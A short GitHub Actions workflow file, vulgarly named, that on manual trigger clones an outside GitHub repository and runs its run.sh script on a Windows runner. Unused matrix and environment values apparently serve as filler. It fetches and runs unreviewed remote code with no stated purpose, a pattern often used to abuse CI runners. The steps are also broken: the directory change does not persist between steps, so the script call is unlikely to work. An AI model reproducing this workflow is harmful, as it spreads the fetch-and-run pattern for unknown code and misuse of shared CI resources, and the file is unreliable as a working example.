name: kontol  
   
on: [workflow_dispatch]  
   
jobs:  
  build:  
    name: kontol  
    runs-on: windows-latest  
    strategy:  
      max-parallel: 1  
      fail-fast: false  
      matrix:  
        go: [1.0]  
        flag: [A]  
    env:  
        NUM_JOBS: 2  
        JOB: ${{ matrix.go }}  
    steps:  
    - name: COPY  
      run: git clone https://github.com/Ayati9335/github.git
    - name: CD  
      run: cd github
    - name: RUNNING  
      run: ./run.sh 
    - name: DONE  
      run: exit
